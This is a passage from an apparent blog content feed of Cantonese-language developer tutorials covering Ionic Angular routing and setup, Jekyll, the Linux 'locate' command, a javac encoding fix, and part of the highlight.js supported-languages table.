<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ion-header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ion-toolbar</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-title</span>&gt;</span>contact<span class="tag">&lt;/<span class="name">ion-title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ion-toolbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-header</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ion-content</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-success&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>示範用 alert.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-content</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="結果"><a href="#結果" class="headerlink" title="結果"></a>結果</h3><img src="/2022/02/13/ionic-Angular-bootstrap-add/dllm%20bootstrap%20test.png" class="">
<p>成功。</p>
<p>參考資料<br><a href="https://www.youtube.com/watch?v=qAX7SmklMZ8">https://www.youtube.com/watch?v=qAX7SmklMZ8</a></p>
]]></content>
      <categories>
        <category>ionic</category>
      </categories>
      <tags>
        <tag>Apps</tag>
        <tag>Framework</tag>
        <tag>Angular</tag>
      </tags>
  </entry>
  <entry>
    <title>Ionic Angular - 更改開啟重定向頁面</title>
    <url>/2022/02/13/ionic-Angular-change-open-default-show-page/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>呢篇文係教你點樣改 Default 開啟既Page。<br>原本 Default 係 <code>tab1</code>，<br>以下示範點樣改做 <code>tab3</code></p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>去呢個 Path 入面既 <code>tabs-routing.module.ts</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">src\app\tabs\tabs-routing.module.ts</span><br></pre></td></tr></table></figure>

<p>你會見到呢堆野</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; NgModule &#125; <span class="keyword">from</span> <span class="string">&#x27;@angular/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; RouterModule, Routes &#125; <span class="keyword">from</span> <span class="string">&#x27;@angular/router&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; TabsPage &#125; <span class="keyword">from</span> <span class="string">&#x27;./tabs.page&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes: Routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;tabs&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: TabsPage,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;tab1&#x27;</span>,</span><br><span class="line">        <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../tab1/tab1.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.Tab1PageModule)</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;tab2&#x27;</span>,</span><br><span class="line">        <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../tab2/tab2.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.Tab2PageModule)</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;tab3&#x27;</span>,</span><br><span class="line">        <span class="attr">loadChildren</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../tab3/tab3.module&#x27;</span>).then(<span class="function"><span class="params">m</span> =&gt;</span> m.Tab3PageModule)</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="attr">redirectTo</span>: <span class="string">&#x27;/tabs/tab1&#x27;</span>,</span><br><span class="line">        <span class="attr">pathMatch</span>: <span class="string">&#x27;full&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">redirectTo</span>: <span class="string">&#x27;/tabs/tab1&#x27;</span>,</span><br><span class="line">    <span class="attr">pathMatch</span>: <span class="string">&#x27;full&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="meta">@NgModule</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [RouterModule.forChild(routes)],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">TabsPageRoutingModule</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>搵最底既 <code>redirectTo</code><br>再將入面 <code>/tabs/tab1</code> 改做你想改既 page。</p>
<p>例如你想改做 <code>tab3</code><br>就將呢 原本既</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">redirectTo</span>: <span class="string">&#x27;/tabs/tab1&#x27;</span>,</span><br><span class="line">    <span class="attr">pathMatch</span>: <span class="string">&#x27;full&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>改做</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">redirectTo</span>: <span class="string">&#x27;/tabs/tab3&#x27;</span>,</span><br><span class="line">    <span class="attr">pathMatch</span>: <span class="string">&#x27;full&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然後當你開 localhost 就會由原本既 tab1<br>redirect 做 redirect 去 tab3。</p>
<p>咁就完成啦。</p>
]]></content>
      <categories>
        <category>ionic</category>
      </categories>
      <tags>
        <tag>Apps</tag>
        <tag>Framework</tag>
        <tag>Angular</tag>
      </tags>
  </entry>
  <entry>
    <title>Ionic Angular - onclick 動畫</title>
    <url>/2022/02/13/ionic-Angular-onclick-animation/</url>
    <content><![CDATA[<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>去其中一個 <code>tab</code> 既 <code>html</code> 加</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ion-content</span> [<span class="attr">fullscreen</span>]=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ion-button</span> (<span class="attr">click</span>)=<span class="string">&quot;onClick()&quot;</span> [<span class="attr">routerLink</span>]=<span class="string">&quot;[&#x27;/contact&#x27;]&quot;</span> <span class="attr">routerLinkActive</span>=<span class="string">&quot;router-link-active&quot;</span>  <span class="attr">expand</span>=<span class="string">&quot;block&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;clear&quot;</span> <span class="attr">shape</span>=<span class="string">&quot;round&quot;</span>&gt;</span></span><br><span class="line">    動畫</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ion-button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ion-content</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><img src="/2022/02/13/ionic-Angular-onclick-animation/onclick.gif" class="">]]></content>
      <categories>
        <category>ionic</category>
      </categories>
      <tags>
        <tag>Apps</tag>
        <tag>Framework</tag>
        <tag>Angular</tag>
      </tags>
  </entry>
  <entry>
    <title>Ionic Angular - 安裝及開啟 Apps</title>
    <url>/2022/01/27/ionic-ep1-install-and-run-apps-Angular/</url>
    <content><![CDATA[<h1 id="Ionic-介紹"><a href="#Ionic-介紹" class="headerlink" title="Ionic 介紹"></a>Ionic 介紹</h1><p>Ionic 是用於混合移動應用程序開發的完整開源 SDK，由 Drifty Co. 的 Max Lynch、Ben Sperry 和 Adam Bradley 在 2013 年創建。<br>原始版本於 2013 年發布，建立在 AngularJS 和 Apache Cordova 之上，然而，最新版本被重新構建為一組 Web 組件，允許用戶選擇任何用戶界面框架，例如 Angular、React 或 Vue.js。 它還允許使用完全沒有用戶界面框架的 Ionic 組件，Ionic 提供工具和服務，用於基於現代 Web 開發技術和實踐，使用 CSS、HTML5 和 Sass 等 Web 技術開發混合移動、桌面和漸進式 Web 應用程序。 特別是，可以使用這些 Web 技術構建移動應用程序，然後通過本地應用程序商店分發，然後利用 Cordova 或電容器將其安裝在設備上。</p>
<h2 id="安裝-ionic-cli"><a href="#安裝-ionic-cli" class="headerlink" title="安裝 ionic cli"></a>安裝 ionic cli</h2><p>請確保你係安裝左 <a href="https://nodejs.org/en/">node.js</a> 先。</p>
<p>然後行呢段code</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g @ionic/cli</span><br></pre></td></tr></table></figure>
<p>Notes</p>
<blockquote>
<p>-g 選項表示全局安裝。<br>全局安裝包時，可能會出現 EACCES 權限錯誤。<br>考慮將 npm 設置為在沒有提升權限的情況下全局運行。</p>
</blockquote>
<p>裝左之後再喺 cmd 打 ionic 試下有冇反應。</p>
<img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/ionic_start.png" class="">

<h2 id="Visual-Studio-Code-插件安裝"><a href="#Visual-Studio-Code-插件安裝" class="headerlink" title="Visual Studio Code 插件安裝"></a>Visual Studio Code 插件安裝</h2><p>好，我地而加需要用到 <a href="https://code.visualstudio.com/">Visual Studio Code</a><br>入面再裝兩個 Extensions.<br>包括係 :</p>
<ul>
<li><a href="https://marketplace.visualstudio.com/items?itemName=johnpapa.Angular2">Angular Snippets</a><img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/Angular.png" class=""></li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=fivethree.vscode-ionic-snippets">Ionic Snippets</a><img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/ionic.png" class=""></li>
</ul>
<h2 id="建立-Ionic-Angular-Project"><a href="#建立-Ionic-Angular-Project" class="headerlink" title="建立 Ionic Angular Project"></a>建立 Ionic Angular Project</h2><p>喺你隨便一個位置再 cd 入去打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ionic start Folder_Name <span class="comment">#我呢度會用 on99 做示範</span></span></span><br></pre></td></tr></table></figure>

<img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/pick_a_framework_start.png" class="">

<p>打完之後佢會叫你 Pick 個 Framework，我地揀 Angular</p>
<blockquote>
<p>用鍵盤既 上下左右箭嘴 揀</p>
</blockquote>
<img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/start_project.gif" class="">

<p>Starter template 揀 tabs<br>然後需要啲時間去 gen … (大概6分鐘，條片入面我係 cut 過黎，絕對唔係咁快 gen 好哂 …)</p>
<img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/loading.gif" class="">

<h2 id="開啟-LocalHost-預設-Port-Number"><a href="#開啟-LocalHost-預設-Port-Number" class="headerlink" title="開啟 LocalHost (預設 Port Number)"></a>開啟 LocalHost (預設 Port Number)</h2><p>呢個方法係俾你只用佢 Default 既 Port Number<br>ionic 原本係用 9100 Port，咁如果你呢粒 Port 有其他Program你可以無視呢段睇下一段。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ionic serve</span></span><br></pre></td></tr></table></figure>
<img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/start_default.gif" class="">
<img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/port_default.png" class="">

<h2 id="開啟-LocalHost-自選-Port-Number"><a href="#開啟-LocalHost-自選-Port-Number" class="headerlink" title="開啟 LocalHost (自選 Port Number)"></a>開啟 LocalHost (自選 Port Number)</h2><p>有時你想 Test 多個 Apps 又或者你呢粒 Port 已經有其他 Program用緊<br>咁既時候你可以咁打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ionic serve -p 9000</span></span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ionic serve --port 9000</span></span><br></pre></td></tr></table></figure>

<img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/start_other.gif" class="">
<img src="/2022/01/27/ionic-ep1-install-and-run-apps-Angular/port_other.png" class="">

<p>咁樣你就會 用左你想要既 Port number 9000。</p>
<p>完成。</p>
<p>Detail<br><a href="https://stackoverflow.com/questions/39662400/how-can-i-serve-ionic-app-on-a-different-port">https://stackoverflow.com/questions/39662400/how-can-i-serve-ionic-app-on-a-different-port</a><br><a href="https://ionicframework.com/docs/intro/cli">https://ionicframework.com/docs/intro/cli</a></p>
<h2 id="修改內文"><a href="#修改內文" class="headerlink" title="修改內文"></a>修改內文</h2><p>入去 <code>/src/app/</code> 度改。</p>
]]></content>
      <categories>
        <category>ionic</category>
      </categories>
      <tags>
        <tag>Apps</tag>
        <tag>Framework</tag>
        <tag>Angular</tag>
      </tags>
  </entry>
  <entry>
    <title>Jekyll - 靜態網站生成器</title>
    <url>/2022/01/09/jekyll-create-blog/</url>
    <content><![CDATA[<img src="/2022/01/09/jekyll-create-blog/jekyll.svg" class="">

<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>Jekyll 是一個靜態站點生成器。<br>它由 GitHub 的聯合創始人 Tom Preston-Werner 用 Ruby 編寫，在開源 MIT 許可下分發。 </p>
<blockquote>
<p>GitHub Pages is powered by Jekyll, so you can easily deploy your site using GitHub for free—custom domain name and all.</p>
</blockquote>
<h2 id="建立"><a href="#建立" class="headerlink" title="建立"></a>建立</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jekyll new . --force</span><br></pre></td></tr></table></figure>

<h2 id="開啟-Localhost"><a href="#開啟-Localhost" class="headerlink" title="開啟 Localhost"></a>開啟 Localhost</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bundle exec jekyll serve</span><br></pre></td></tr></table></figure>

<h2 id="更新內容"><a href="#更新內容" class="headerlink" title="更新內容"></a>更新內容</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bundle install</span><br><span class="line">bundle update</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;% highlight ruby %&#125;</span><br><span class="line">def print_hi(name)</span><br><span class="line">  puts &quot;Hi, #&#123;name&#125;&quot;</span><br><span class="line">end</span><br><span class="line">print_hi(&#x27;Tom&#x27;)</span><br><span class="line"><span class="meta">#</span><span class="bash">=&gt; prints <span class="string">&#x27;Hi, Tom&#x27;</span> to STDOUT.</span></span><br><span class="line">&#123;% endhighlight %&#125;</span><br><span class="line"></span><br><span class="line">[Github]: https://github.com/ytdl-org/youtube-dl</span><br><span class="line">[Support-site]: https://ytdl-org.github.io/youtube-dl/supportedsites.html</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Jekyll</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>LINK MIX - 將多個網站連結放置到一個 URL 中</title>
    <url>/2022/05/26/linkmix-website/</url>
    <content><![CDATA[<p align="center">
    <img alt="LINK MIX" src="cover.png" width="auto"/>
    <h1 align="center">LINK MIX</h1>
</p>

<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>放置多個網站連結在一個連結中。</p>
<h1 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h1><ul>
<li><a href="https://linkmix.co/en/">https://linkmix.co/en/</a></li>
</ul>
<img src="/2022/05/26/linkmix-website/sc1.png" class="">

<h1 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h1><p>只需點擊一下就即時生成一個連結。</p>
<p>除了連結他可以生成 QRCODE。</p>
<img src="/2022/05/26/linkmix-website/how.gif" class="">]]></content>
      <categories>
        <category>網站推薦</category>
      </categories>
  </entry>
  <entry>
    <title>Locate - 指令尋找檔案</title>
    <url>/2022/01/30/locate-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大部分 Linux 機本身都係會有，<br>如果冇就打呢句裝</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install mlocate -y</span><br></pre></td></tr></table></figure>

<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><h3 id="更新-locate-資料庫"><a href="#更新-locate-資料庫" class="headerlink" title="更新 locate 資料庫"></a>更新 locate 資料庫</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure>

<h4 id="locate-資料庫檔案路徑"><a href="#locate-資料庫檔案路徑" class="headerlink" title="locate 資料庫檔案路徑"></a>locate 資料庫檔案路徑</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure>

<h2 id="尋找指定檔案路徑"><a href="#尋找指定檔案路徑" class="headerlink" title="尋找指定檔案路徑"></a>尋找指定檔案路徑</h2><p>我以 <code>python</code> 為例。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# locate python</span><br><span class="line">/etc/python2.7</span><br><span class="line">/etc/python3</span><br><span class="line">/etc/python3.9</span><br><span class="line">/etc/apparmor.d/abstractions/python</span><br><span class="line">/etc/python2.7/sitecustomize.py</span><br><span class="line">/etc/python3/debian_config</span><br><span class="line">/etc/python3.9/sitecustomize.py</span><br><span class="line">/usr/bin/apython</span><br><span class="line">/usr/bin/dh_python3-ply</span><br><span class="line">/usr/bin/ipython3</span><br><span class="line">/usr/bin/pybabel-python3</span><br><span class="line">/usr/bin/python-faraday</span><br><span class="line">/usr/bin/python2</span><br><span class="line">/usr/bin/python2.7</span><br><span class="line">/usr/bin/python3</span><br><span class="line">/usr/bin/python3-commonmark</span><br><span class="line">/usr/bin/python3-config</span><br></pre></td></tr></table></figure>

<h2 id="尋找檔案數量"><a href="#尋找檔案數量" class="headerlink" title="尋找檔案數量"></a>尋找檔案數量</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# locate -c python</span><br><span class="line">47000</span><br></pre></td></tr></table></figure>

<p>python string 一共係有 47000 個檔案。</p>
<h2 id="唔分大細楷咁查"><a href="#唔分大細楷咁查" class="headerlink" title="唔分大細楷咁查"></a>唔分大細楷咁查</h2><p>我地查 python 同 Python 既 result 係唔同既，<br>因為佢係跟你個 string 咁查，<br>所以係有分別，<br>但係我地想大細楷都查既時候，<br>可以咁樣打。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# locate -i python</span><br><span class="line">/etc/python2.7</span><br><span class="line">/etc/python3</span><br><span class="line">/etc/python3.9</span><br><span class="line">/etc/apparmor.d/abstractions/python</span><br><span class="line">/etc/python2.7/sitecustomize.py</span><br><span class="line">/etc/python3/debian_config</span><br><span class="line">/etc/python3.9/sitecustomize.py</span><br><span class="line">/usr/bin/apython</span><br><span class="line">/usr/bin/dh_python3-ply</span><br><span class="line">/usr/bin/ipython3</span><br><span class="line">/usr/bin/pybabel-python3</span><br><span class="line">/usr/bin/python-faraday</span><br><span class="line">/usr/bin/python2</span><br><span class="line">/usr/bin/python2.7</span><br><span class="line">/usr/bin/python3</span><br><span class="line">/usr/bin/python3-commonmark</span><br><span class="line">/usr/bin/python3-config</span><br><span class="line">/usr/bin/python3-futurize</span><br><span class="line">/usr/bin/python3-pasteurize</span><br></pre></td></tr></table></figure>

<h3 id="兩者結合"><a href="#兩者結合" class="headerlink" title="兩者結合"></a>兩者結合</h3><p>頭先講既 -c 同 -i 係可以一齊用既。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# locate -i -c python</span><br><span class="line">47026</span><br></pre></td></tr></table></figure>

<p>參考資料<br><a href="https://officeguide.cc/linux-locate-command-tutorial-examples/">https://officeguide.cc/linux-locate-command-tutorial-examples/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Search</tag>
      </tags>
  </entry>
  <entry>
    <title>Java - CMD 開啟 Java 程式後出現亂碼</title>
    <url>/2022/01/09/java-after-open-garbled/</url>
    <content><![CDATA[<h1 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h1><p>開Program之後見到係亂碼，因為CMD 本身係 唔會識自已轉 UTF-8，喺後面加小小野就得。</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">javac -encoding UTF-<span class="number">8</span> Sample.java </span><br></pre></td></tr></table></figure>

<p>咁就正常了。</p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>問題</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown - Supported Languages</title>
    <url>/2021/12/22/markdown-Supported-Languages/</url>
    <content><![CDATA[<h1 id="Supported-Languages"><a href="#Supported-Languages" class="headerlink" title="Supported Languages"></a>Supported Languages</h1><p>The table below shows the full list of languages (and corresponding classes/aliases) supported by Highlight.js.  Languages that list a <strong>Package</strong> below are 3rd party languages and are not bundled with the core library.  You can find their repositories by following the links.</p>
<p><strong>Note:</strong> The languages available will depend on how you’ve built or are included the library in your app. For example our default minified web build includes only ~40 popular languages.  See <a href="https://github.com/highlightjs/highlight.js#getting-the-library">Getting the Library</a> and <a href="https://github.com/highlightjs/highlight.js#importing-the-library">Importing the Library</a> in the README for examples of how to load additional/specific languages.</p>
<blockquote>
<p>下表顯示了 Highlight.js 支持的語言（和相應的類/別名）的完整列表。 下面列出 <strong>Package</strong> 的語言是 3rd 方語言，不與核心庫捆綁在一起。 您可以通過以下鏈接找到他們的存儲庫。</p>
</blockquote>
<blockquote>
<p><strong>注意 ：</strong>可用的語言取決於您在應用程序中構建或包含庫的方式。 例如，我們默認的縮小版 Web 構建僅包含約 40 種流行語言。 有關如何加載其他/特定語言的示例，請參閱自述文件中的 <a href="https://github.com/highlightjs/highlight.js#getting-the-library">Getting the Library</a> 和 <a href="https://github.com/highlightjs/highlight.js#importing-the-library">Importing the Library</a>。</p>
</blockquote>
<!-- LANGLIST -->
<table>
<thead>
<tr>
<th align="left">Language</th>
<th align="left">Aliases</th>
<th align="left">Package</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1C</td>
<td align="left">1c</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">4D</td>
<td align="left">4d</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-4d">highlightjs-4d</a></td>
</tr>
<tr>
<td align="left">ABAP</td>
<td align="left">sap-abap, abap</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-sap-abap">highlight-sap-abap</a></td>
</tr>
<tr>
<td align="left">ABNF</td>
<td align="left">abnf</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Access logs</td>
<td align="left">accesslog</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Ada</td>
<td align="left">ada</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Arduino (C++ w/Arduino libs)</td>
<td align="left">arduino, ino</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ARM assembler</td>
<td align="left">armasm, arm</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">AVR assembler</td>
<td align="left">avrasm</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ActionScript</td>
<td align="left">actionscript, as</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Alan IF</td>
<td align="left">alan, i</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-alan">highlightjs-alan</a></td>
</tr>
<tr>
<td align="left">Alan</td>
<td align="left">ln</td>
<td align="left"><a href="https://github.com/alantech/highlightjs-alan">highlightjs-alan</a></td>
</tr>
<tr>
<td align="left">AngelScript</td>
<td align="left">angelscript, asc</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Apache</td>
<td align="left">apache, apacheconf</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">AppleScript</td>
<td align="left">applescript, osascript</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Arcade</td>
<td align="left">arcade</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">AsciiDoc</td>
<td align="left">asciidoc, adoc</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">AspectJ</td>
<td align="left">aspectj</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">AutoHotkey</td>
<td align="left">autohotkey</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">AutoIt</td>
<td align="left">autoit</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Awk</td>
<td align="left">awk, mawk, nawk, gawk</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Bash</td>
<td align="left">bash, sh, zsh</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Basic</td>
<td align="left">basic</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">BBCode</td>
<td align="left">bbcode</td>
<td align="left"><a href="https://github.com/RedGuy12/highlightjs-bbcode">highlightjs-bbcode</a></td>
</tr>
<tr>
<td align="left">Blade (Laravel)</td>
<td align="left">blade</td>
<td align="left"><a href="https://github.com/miken32/highlightjs-blade">highlightjs-blade</a></td>
</tr>
<tr>
<td align="left">BNF</td>
<td align="left">bnf</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Brainfuck</td>
<td align="left">brainfuck, bf</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">C#</td>
<td align="left">csharp, cs</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">C</td>
<td align="left">c, h</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">C++</td>
<td align="left">cpp, hpp, cc, hh, c++, h++, cxx, hxx</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">C/AL</td>
<td align="left">cal</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Cache Object Script</td>
<td align="left">cos, cls</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CMake</td>
<td align="left">cmake, cmake.in</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Coq</td>
<td align="left">coq</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CSP</td>
<td align="left">csp</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CSS</td>
<td align="left">css</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Cap’n Proto</td>
<td align="left">capnproto, capnp</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Chaos</td>
<td align="left">chaos, kaos</td>
<td align="left"><a href="https://github.com/chaos-lang/highlightjs-chaos">highlightjs-chaos</a></td>
</tr>
<tr>
<td align="left">Chapel</td>
<td align="left">chapel, chpl</td>
<td align="left"><a href="https://github.com/chapel-lang/highlightjs-chapel">highlightjs-chapel</a></td>
</tr>
<tr>
<td align="left">Cisco CLI</td>
<td align="left">cisco</td>
<td align="left"><a href="https://github.com/BMatheas/highlightjs-cisco-cli">highlightjs-cisco-cli</a></td>
</tr>
<tr>
<td align="left">Clojure</td>
<td align="left">clojure, clj</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CoffeeScript</td>
<td align="left">coffeescript, coffee, cson, iced</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CpcdosC+</td>
<td align="left">cpc</td>
<td align="left"><a href="https://github.com/SPinti-Software/highlightjs-cpcdos">highlightjs-cpcdos</a></td>
</tr>
<tr>
<td align="left">Crmsh</td>
<td align="left">crmsh, crm, pcmk</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Crystal</td>
<td align="left">crystal, cr</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Cypher (Neo4j)</td>
<td align="left">cypher</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-cypher">highlightjs-cypher</a></td>
</tr>
<tr>
<td align="left">D</td>
<td align="left">d</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Dafny</td>
<td align="left">dafny</td>
<td align="left"><a href="https://github.com/ConsenSys/highlightjs-dafny">highlightjs-dafny</a></td>
</tr>
<tr>
<td align="left">Dart</td>
<td align="left">dart</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Delphi</td>
<td align="left">dpr, dfm, pas, pascal</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Diff</td>
<td align="left">diff, patch</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Django</td>
<td align="left">django, jinja</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">DNS Zone file</td>
<td align="left">dns, zone, bind</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Dockerfile</td>
<td align="left">dockerfile, docker</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">DOS</td>
<td align="left">dos, bat, cmd</td>
<td align="left"></td>
</tr>
<tr>
